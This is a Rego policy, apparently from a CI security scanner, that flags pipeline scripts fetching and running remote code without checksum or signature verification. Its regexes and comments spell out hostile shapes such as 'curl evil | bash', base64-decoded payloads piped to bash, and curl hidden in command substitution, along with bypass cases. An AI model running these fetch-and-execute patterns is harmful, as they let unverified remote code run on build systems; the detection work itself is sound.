# unverified-scripts — flag pipeline scripts that download or inline
# executable content without integrity verification. Classic vectors
# include `curl ... | bash`, download-then-exec, redirect-to-file-then-
# exec, Megalodon-style `echo "..." | base64 -d | bash`, and any
# command piped into a shell without verification.
#
# False-positive guards: the pattern check operates on the line with
# quoted substrings stripped, so a `| bash` that sits inside a string
# literal (an `echo` of installation instructions, a comment in a
# heredoc body) does not trigger. The heredoc-marker skip is scoped
# to the generic `| <shell>` pattern only, so a heredoc marker on the
# same line as a curl/wget/base64 download (`curl evil | bash <<EOF`)
# does NOT shield it from detection — the operator-intent argument
# only holds when the line itself isn't fetching external content.
# A leading echo/printf piping in-workflow data into an interpreter
# (`echo "$VAR" | python3 -c ...`) is likewise exempt from the generic
# pattern only, and only when no curl/wget/base64 is on the line
# (issue #236).
#
# Lines that include a checksum / signature verification command on
# the same line (sha256sum, shasum, gpg --verify, cosign verify, …)
# are treated as intentionally verified and skipped.
package unverified_scripts

import rego.v1

# Shell interpreters commonly used as pipe targets in CI attacks.
_shell := `bash|sh|zsh|python[23]?|perl|ruby|dash|ksh`

# Rego's raw (backtick-delimited) strings can't contain a literal
# backtick, so the character lives in an ordinary double-quoted string
# instead (backtick carries no special meaning there) and gets spliced
# into the raw regex patterns below with sprintf, wherever a backtick
# command substitution needs matching.
_backtick := "`"

deny contains finding if {
	some i, j
	job := input.pipeline.jobs[i]
	line := job.scripts[j]
	visible := _visible_line(line)
	_unsafe_script_line(visible, line)
	# Verification keyword check runs on the stripped line so an
	# attacker can't bypass the rule by putting `sha256sum` /
	# `cosign verify` inside a quoted string ("must sha256sum first").
	# Trust check runs on the stripped line and against the actual
	# curl/wget fetch target so a mention of a trusted host inside an
	# echo string, a `#` comment, or a different physical line of the
	# same `run:` block cannot suppress the finding for the real fetch.
	not _line_is_verified(visible)
	not _fetch_target_is_trusted(visible, line)
	finding := {
		"code":       "ISSUE-411",
		"severity":   "high",
		"message":    sprintf("Job `%s` runs a script fetched from the network: `%s`.", [job.name, _quoted_script_line(line)]),
		"job":        job.name,
		"scriptLine": line,
	}
}

# The script line as quoted in the message. A backtick command
# substitution's own closing backtick can land right where the
# message's wrapping backtick closes too, reading as an empty
# backquoted token (two backticks back to back) rather than the code it
# actually is; trimming one trailing backtick before quoting avoids
# that collision without changing what the excerpt says.
_quoted_script_line(line) := trim_suffix(trim_space(line), _backtick)

# Strip quoted substrings (double then single quotes) and inline `#`
# comments so neither a pipe-to-shell hidden in a string literal nor a
# trusted hostname mentioned in a trailing comment can grant trust to
# the rest of the line. Inline comments require leading whitespace so
# URL fragments (`https://example.com/path#frag`) are preserved.
_visible_line(line) := stripped if {
	once := regex.replace(line, `"[^"]*"`, "")
	twice := regex.replace(once, `'[^']*'`, "")
	stripped := regex.replace(twice, `\s+#.*`, "")
}

# Heredoc on the same line — `cat <<EOF | bash`, `<<-EOF`, `<<'EOF'`,
# `<< "EOF"`. The pipe target is operator-authored, in-tree content,
# not an externally-sourced payload; any unsafe download inside the
# body still fires on its own script line.
_has_heredoc(line) if {
	regex.match(`<<-?\s*['"]?\w+`, line)
}

# Patterns 1–4 fetch external content on the same line as the pipe,
# so a heredoc marker on the line does not shield them: an attacker
# putting `curl evil | bash <<EOF` is still doing a remote pipe-to-
# shell, the heredoc is just camouflage.

# curl|wget piped directly into a shell (classic supply-chain vector).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^|&;\n]*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Download then execute on the same line (curl -o … && bash, etc.).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^&;\n]*&&\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Download to a file then execute (; or &&).
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(curl|wget)\s+[^;\n]*(?:>\s*\S+|-o\s+\S+)[^;\n]*(?:;|&&)\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# Inline obfuscated payload (Megalodon: echo "…" | base64 -d | bash).
# The base64 blob gets stripped along with its quotes, but `echo  |
# base64 -d | bash` still matches because the rest of the chain is on
# the visible side of the quotes.
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(echo|printf)\s+[^|]*\|\s*base64\s+(-d|--decode)\s*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# A shell reading a fetched script through process substitution
# (`bash <(curl -s https://codecov.io/bash)`, the Codecov bash uploader)
# runs it exactly as a pipe would. The shell must be the command itself
# (optionally path-qualified or under sudo, flags allowed before the
# substitution), so `diff <(curl a) <(curl b)` is not a match.
_unsafe_script_line(visible, _) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+(?:-\S+\s+)*<\(\s*(curl|wget)\b`, [_shell]), visible)
}

# The command-substitution form (`/bin/bash -c "$(curl -fsSL ...)"`, the
# Homebrew/Docker installer). The substitution sits inside double quotes,
# which _visible_line strips, so the fetch is read off the raw line; the
# shell and its -c must still be on the visible side, so the same text
# inside an echo string does not match. Flags between the shell and -c are
# allowed, mirroring the process-substitution rule above: a bundle of
# boolean flags (`bash -eu -c "$(curl ...)"`) and a flag taking its own
# argument word (`bash -euo pipefail -c ...`, the hardened-CI idiom) are
# both still the same invocation, and so is a single bundled flag token
# whose LAST letter is `c` (`bash -euc "$(curl ...)"`): POSIX short-flag
# bundling reads a flag that takes an argument only when it is the
# trailing letter of the bundle, so `-c` need not be its own token. A
# bundle where `c` is NOT trailing (`-ce`) is a different flag and is not
# this shell's -c at all. The skip stops at `;`, `&` or `|` so it can't
# reach past this command into an unrelated one later on the line. The
# fetch need not be the substitution's first token either: a throwaway
# command before the real curl/wget (`$(printf ''; curl ...)`, `$(set -e;
# curl ...)`) still runs once the substitution's output reaches `bash
# -c`, so the fetch is matched anywhere inside the substitution, stopping
# at its closing `)` so it can't reach into a later, unrelated one.
_shell_c_dollar_paren_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c\s+["']?\$\([^)]*?\b(curl|wget)\b`, [_shell])

_unsafe_script_line(visible, line) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c\b`, [_shell]), visible)
	regex.match(_shell_c_dollar_paren_pattern, line)
}

# `eval "$(curl ...)"` / `eval $(wget ...)`: eval runs a command
# substitution's stdout as if it were typed, the same risk as a shell's
# own `-c`. Quotes around the substitution are optional and make no
# difference to what eval executes, so both are accepted. The fetch need
# not be the substitution's first token, mirroring the shell-c pattern
# above.
_eval_dollar_paren_pattern := `(?i)(?:^|[\s;&|(])eval\s+["']?\$\([^)]*?\b(curl|wget)\b`

_unsafe_script_line(visible, line) if {
	regex.match(`(?i)(?:^|[\s;&|(])eval\b`, visible)
	regex.match(_eval_dollar_paren_pattern, line)
}

# `` eval `curl ...` `` / `` <shell> -c `curl ...` ``: backtick command
# substitution, the older POSIX syntax for the same `$( ... )` construct.
# The front command (eval, or a shell's -c, bundled flags and all) sits
# before the opening backtick, which a wrapping double quote would strip
# from the visible line exactly as it does for `$( ... )`, so the front
# command is read off the visible line and the backtick-fetch shape off
# the raw line, mirroring the `$( ... )` rule above. The fetch need not be
# the substitution's first token, stopping at the closing backtick so it
# can't reach into a later, unrelated substitution.
_eval_backtick_pattern := sprintf(`(?i)(?:^|[\s;&|(])eval\s+["']?%s[^%s]*?\b(curl|wget)\b`, [_backtick, _backtick])

_unsafe_script_line(visible, line) if {
	regex.match(`(?i)(?:^|[\s;&|(])eval\b`, visible)
	regex.match(_eval_backtick_pattern, line)
}

_shell_c_backtick_pattern := sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c\s+["']?%s[^%s]*?\b(curl|wget)\b`, [_shell, _backtick, _backtick])

_unsafe_script_line(visible, line) if {
	regex.match(sprintf(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:\S*/)?(%s)\s+[^;&|\n]*?-[a-zA-Z]*c\b`, [_shell]), visible)
	regex.match(_shell_c_backtick_pattern, line)
}

# `source <(curl ...)` / `. <(curl ...)`: the shell builtins that read a
# process substitution's output as a script, exactly like `<shell>
# <( ... )` above but fronted by the sourcing builtin instead of an
# interpreter invocation.
_unsafe_script_line(visible, _) if {
	regex.match(`(?i)(?:^|[\s;&|(])(?:sudo\s+)?(?:source|\.)\s+(?:-\S+\s+)*<\(\s*(curl|wget)\b`, visible)
}

# Generic `<anything> | <shell>` catch-all. Skipped on heredoc-marker
# lines because `cat <<EOF | bash` is in-tree operator-authored content
# — but only when the line isn't ALSO matching one of the more specific
# patterns above (those run regardless of heredoc presence). Also
# skipped when the line is a leading echo/printf of in-workflow data
# (issue #236): piping a local variable into an interpreter is not a
# remote-code fetch.
_unsafe_script_line(visible, line) if {
	not _has_heredoc(line)
	not _echo_of_local_data(visible, line)
	regex.match(sprintf(`(?i)\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
}

# A line that starts with echo/printf and carries no curl/wget/base64
# pipes operator-authored or in-workflow data (a variable, the `needs`
# context) into the interpreter — local data, not a download (issue
# #236: electron's `echo "$NEEDS_CONTEXT" | python3 -c ...`). Scoped
# to the generic catch-all only: the download patterns and the
# Megalodon `echo | base64 -d | bash` chain match through their own
# bodies regardless, and the curl/wget/base64 guard means any fetch or
# decode on the line voids the exemption. The fetch check runs against
# the RAW line, not `visible`: a curl hidden in a quoted command
# substitution (`echo "$(curl evil)" | bash`) is stripped by
# _visible_line, so checking `visible` would let it through (issue #236).
_echo_of_local_data(visible, line) if {
	regex.match(`(?i)^\s*(echo|printf)\b`, visible)
	not regex.match(`(?i)\b(curl|wget|base64)\b`, line)
}

_line_is_verified(line) if {
	regex.match(`(?i)(sha256sum|sha512sum|sha1sum|shasum|gpg\s+--verify|cosign\s+verify)`, line)
}

# Extract every URL or bare-hostname token that appears as a fetch
# target on a curl/wget command in the visible (quote/comment stripped)
# line. If the unsafe line is not a curl/wget download on its visible
# side (base64 pipe, generic `| bash`, or a fetch hiding entirely inside
# a quoted substitution), this yields the empty set: the default below
# makes that an empty contribution to the union, never an undefined one.
default _fetch_targets(_) := set()

_fetch_targets(visible) := targets if {
	regex.match(`(?i)\b(curl|wget)\b`, visible)
	targets := {t |
		some t in regex.find_n(`https?://[^\s|;)'"]+|\b[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9-]+)+(?:/[^\s|;)'"]*)?`, visible, -1)
	}
}

# The command-substitution form hides its fetch(es) inside double quotes,
# which _visible_line strips, so the ordinary visible-line extraction
# above never sees them: without this, an allowlisted host still fires on
# `bash -c "$(curl -fsSL https://trusted/install.sh)"`. See
# _command_substitution_fetch_targets below for its own default.
#
# Trust is ONE decision over the UNION of both kinds of fetch target on
# the line, every one of which must match a configured pattern: a
# visible-line fetch and a command-substitution fetch are gathered into
# one set first, so a trusted fetch of one kind can never suppress an
# untrusted fetch of the other kind sitting on the same line (two
# independent OR'd checks, each granting trust for the whole line from
# only its own subset, used to let exactly that happen). A line can also
# carry more than one substitution, so every fetch-bearing one found on
# it contributes its own targets to the same set: a decoy substitution
# naming a trusted host as plain text, or a second, untrusted fetch
# substitution elsewhere on the line, must never hide an untrusted fetch
# that actually runs.
_fetch_target_is_trusted(visible, line) if {
	targets := _fetch_targets(visible) | _command_substitution_fetch_targets(line)
	count(targets) > 0
	every target in targets {
		_target_is_trusted(target)
	}
}

# Scoped to lines that actually match one of the recognized command- or
# backtick-substitution shapes above, so an unrelated $( ... ) on a line
# that's unsafe for some other reason (a plain `curl | bash` pipe, say)
# can't accidentally grant or deny trust through this path. Once scoped,
# every substitution on the line that itself fetches something (not a
# decoy like `$(echo trusted-host)`, not an unrelated `$(dirname "$0")`)
# contributes its targets. The default empty set is what makes this an
# empty (not undefined) contribution to _fetch_target_is_trusted's union
# when the line carries no command-substitution fetch at all.
default _command_substitution_fetch_targets(_) := set()

_command_substitution_fetch_targets(line) := targets if {
	_is_command_substitution_fetch_line(line)
	spans := _fetch_bearing_spans(line)
	count(spans) > 0
	targets := {t |
		some span in spans
		some t in _targets_in(span)
	}
}

_is_command_substitution_fetch_line(line) if regex.match(_shell_c_dollar_paren_pattern, line)

_is_command_substitution_fetch_line(line) if regex.match(_eval_dollar_paren_pattern, line)

_is_command_substitution_fetch_line(line) if regex.match(_shell_c_backtick_pattern, line)

_is_command_substitution_fetch_line(line) if regex.match(_eval_backtick_pattern, line)

# Every $( ... ) command substitution on the line, as the text each one
# wraps. The capture group allows one level of nesting (a balanced
# `\( ... \)` pair inside the body), so a substitution with another
# substitution inside it ($(curl -s "$(echo ...)...")) is captured whole
# instead of truncated at the first closing parenthesis: a span that
# doesn't resolve to a clean, known-trusted target is read as untrusted,
# never as trusted.
_dollar_paren_spans(line) := {span |
	some m in regex.find_all_string_submatch_n(`\$\(((?:[^()]|\([^()]*\))*)\)`, line, -1)
	span := m[1]
}

# Every backtick command substitution on the line, as the text each one
# wraps.
_backtick_spans(line) := {span |
	some m in regex.find_all_string_submatch_n(sprintf(`%s([^%s]*)%s`, [_backtick, _backtick, _backtick]), line, -1)
	span := m[1]
}

# The subset of this line's substitution spans that actually fetch
# something: the only ones a trust decision needs to look at.
_fetch_bearing_spans(line) := {span |
	some span in (_dollar_paren_spans(line) | _backtick_spans(line))
	regex.match(`(?i)\b(curl|wget)\b`, span)
}

# The shared URL/hostname extraction, once a substitution's own span has
# been isolated: the same regex the visible-line path above uses, just
# scoped to that span instead of the whole line.
_targets_in(span) := targets if {
	targets := {t |
		some t in regex.find_n(`https?://[^\s|;)'"]+|\b[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9][a-zA-Z0-9-]+)+(?:/[^\s|;)'"]*)?`, span, -1)
	}
}

# A target matches trustedUrls when any configured glob matches either
# the target as-extracted (so patterns like "firebase.tools" or
# "https://firebase.tools" both work) or the target with the scheme
# prepended ("firebase.tools" -> "https://firebase.tools" lets a
# pattern with scheme match a bare-hostname fetch).
_target_is_trusted(target) if {
	some pattern in input.config.unverifiedScripts.trustedUrls
	some candidate in [target, concat("", ["https://", target])]
	glob.match(pattern, null, candidate)
}
